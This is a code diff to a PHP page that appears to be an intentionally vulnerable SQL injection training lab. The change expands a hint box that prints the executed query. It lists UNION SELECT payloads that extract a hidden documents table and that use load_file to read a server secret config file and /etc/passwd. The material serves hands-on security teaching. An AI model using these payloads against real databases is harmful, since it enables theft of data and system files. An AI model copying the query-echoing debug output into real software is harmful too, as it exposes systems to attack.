@@ -125,8 +125,18 @@
             <span class="debug-label">EXECUTED QUERY:</span>
             <code class="debug-code"><?php echo htmlspecialchars($sql); ?></code>
             <div style="margin-top: 0.5rem; font-size: 0.8em; color: #64748b;">
-                <strong>Hint:</strong> Extract hidden documents. Try:
-                <code class="debug-code" style="font-size: 0.8em; opacity: 0.9;">-1 UNION SELECT 1, filename, content FROM secret_documents #</code>
+                <strong>Hints:</strong>
+                <ul style="margin: 0.5rem 0 0 1.5rem; padding: 0;">
+                    <li>Extract hidden docs: 
+                        <code class="debug-code" style="display:inline; padding: 0.2rem;">0 UNION SELECT 1, filename, content FROM secret_documents</code>
+                    </li>
+                    <li>Read internal config (Sandbox): 
+                        <code class="debug-code" style="display:inline; padding: 0.2rem;">0 UNION SELECT 1, 'Config', load_file('/var/www/html/server_secret.ini')</code>
+                    </li>
+                    <li>Read system users (Real Linux): 
+                        <code class="debug-code" style="display:inline; padding: 0.2rem;">0 UNION SELECT 1, 'Users', load_file('/etc/passwd')</code>
+                    </li>
+                </ul>
             </div>
         </div>
     </div>
